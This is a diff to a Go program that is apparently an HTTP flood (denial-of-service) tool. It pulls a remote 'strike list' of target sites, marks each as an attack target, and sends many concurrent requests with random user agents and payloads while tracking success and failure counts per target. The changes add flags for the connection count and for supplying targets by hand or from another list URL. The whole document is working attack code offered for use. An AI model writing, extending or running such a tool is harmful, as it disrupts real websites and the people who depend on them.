@@ -2,11 +2,14 @@ package main
 
 import (
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
+	"os"
 	"strconv"
 	"strings"
 	"sync/atomic"
@@ -46,6 +49,17 @@ type statItem struct {
 	startTime time.Time
 }
 
+type arrayFlags []string
+
+func (i *arrayFlags) String() string {
+	return "[" + strings.Join(*i, ",") + "]"
+}
+
+func (i *arrayFlags) Set(value string) error {
+	*i = append(*i, value)
+	return nil
+}
+
 const (
 	strikeUrl             = "https://hutin-puy.nadom.app/sites.json"
 	strikeRefreshInterval = 60 * time.Second
@@ -73,17 +87,41 @@ var (
 )
 
 func main() {
-	initClients()
+	var (
+		threads int
+		siteUrl string
+		sites   arrayFlags
+	)
 
-	limiter = make(chan struct{}, maxProcs)
-	refresher = make(chan struct{}, 1)
-	statData = statistics{}
+	flag.IntVar(&threads, "max-routines", maxProcs, "Maximum number of simultaneous connections.")
+	flag.Var(&sites, "site", "Sites list. Can be used multiple times. Have precedence over `sites-url` if set")
+	flag.StringVar(&siteUrl, "sites-url", strikeUrl, "URL to fetch sites list from.")
+	flag.Parse()
 
-	startStrikeListRefresher()
-	time.Sleep(time.Second) // NOTE: give a chance to fetch sites list
-	ua.Random()             // NOTE: init cache at this point. bug noticed below...
+	initVariables()
+	limiter = make(chan struct{}, threads)
 
-	startStatsPrinter(&statData, &strikeList)
+	if len(sites) > 0 {
+		for _, site := range sites {
+			sUrl, err := url.Parse(site)
+			if err != nil {
+				fmt.Printf("error parsing %s\n", site)
+				continue
+			}
+			si := strikeItem{Url: sUrl.Scheme + "://" + sUrl.Host, Page: sUrl.String(), Atack: true, Protocol: sUrl.Scheme, Port: sUrl.Port}
+			strikeList = append(strikeList, si)
+		}
+	} else {
+		startStrikeListRefresher(&siteUrl)
+		time.Sleep(4 * time.Second) // NOTE: give a chance to fetch sites list
+	}
+
+	if len(strikeList) == 0 {
+		fmt.Println("no sites to fuck! exiting...")
+		os.Exit(1)
+	}
+
+	startStatsPrinter(&statData, strikeList)
 
 	for {
 		time.Sleep(100 * time.Millisecond)
@@ -114,13 +152,12 @@ func main() {
 						atomic.AddInt32(&site.succCnt, 1)
 					}
 				}(strike)
-
 			}
 		}()
 	}
 }
 
-func fetchStrikeList() error {
+func fetchStrikeList(siteUrl *string) error {
 	refresher <- struct{}{}
 	defer func() { <-refresher }()
 
@@ -131,14 +168,14 @@ func fetchStrikeList() error {
 		err  error
 	)
 
-	req, err = http.NewRequest(http.MethodGet, strikeUrl, nil)
+	req, err = http.NewRequest(http.MethodGet, *siteUrl, nil)
 	if err != nil {
 		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
 	}
 
-	req.Header.Set("Cache-Control", "no-cache")
-	req.Header.Set("Accept-Charset", acceptCharset)
-	req.Header.Set("Accept", "text/json, application/json")
+	// req.Header.Set("Cache-Control", "no-cache")
+	// req.Header.Set("Accept-Charset", acceptCharset)
+	// req.Header.Set("Accept", "text/json, application/json")
 
 	resp, err = noProxyClient.Do(req)
 	if err != nil {
@@ -182,7 +219,7 @@ func fetchStrikeList() error {
 	return err
 }
 
-func startStrikeListRefresher() {
+func startStrikeListRefresher(siteUrl *string) {
 	ticker := time.NewTicker(500 * time.Millisecond)
 
 	go func() {
@@ -190,7 +227,7 @@ func startStrikeListRefresher() {
 			select {
 			case <-ticker.C:
 				ticker.Stop()
-				if err := fetchStrikeList(); err != nil {
+				if err := fetchStrikeList(siteUrl); err != nil {
 					fmt.Println("failed to fetch site List. retrying...")
 					fmt.Println(err.Error())
 
@@ -203,23 +240,38 @@ func startStrikeListRefresher() {
 	}()
 }
 
-func startStatsPrinter(stat *statistics, strikes *[]strikeItem) {
+func startStatsPrinter(stat *statistics, strikes []strikeItem) {
 	ticker := time.NewTicker(4 * time.Second)
 
 	go func() {
 		for {
 			select {
 			case <-ticker.C:
-				stats := tm.NewTable(1, 8, 4, ' ', 0)
-				// tm.MoveCursor(1, 1)
+				stats := tm.NewTable(0, 8, 4, ' ', 0)
 				ct := time.Now()
 				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
-				fmt.Fprintf(stats, "#\tURL\tSUCC\tFAIL\tDUR\n")
-				for i, strike := range *strikes {
-					site := (*stat)[strike.Url]
-					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n", i+1, strike.Url, atomic.LoadInt32(&site.succCnt), atomic.LoadInt32(&site.failCnt), ct.Sub(site.startTime))
+				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
+				for i, strike := range strikes {
+					site, ok := (*stat)[strike.Url]
+					var (
+						succ, fail int32
+						diff       time.Duration
+					)
+					if ok {
+						succ = atomic.LoadInt32(&site.succCnt)
+						fail = atomic.LoadInt32(&site.failCnt)
+						diff = ct.Sub(site.startTime)
+					}
+					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n",
+						i+1,
+						strike.Url,
+						succ,
+						fail,
+						diff,
+					)
 				}
 				tm.Clear()
+				tm.MoveCursor(1, 1)
 				tm.Println(stats)
 				tm.Flush()
 			}
@@ -267,7 +319,7 @@ func buildblock(size int) (s string) {
 	return string(a)
 }
 
-func initClients() {
+func initVariables() {
 	tr := http.DefaultTransport.(*http.Transport).Clone()
 	tr.Proxy = nil
 	noProxyClient = &http.Client{Transport: tr}
@@ -279,4 +331,9 @@ func initClients() {
 		KeepAlive: 5 * time.Second,
 	}).DialContext
 	proxyClient = &http.Client{Transport: tr2}
+
+	refresher = make(chan struct{}, 1)
+	statData = statistics{}
+
+	ua.Random() // NOTE: init cache at this point.
 }
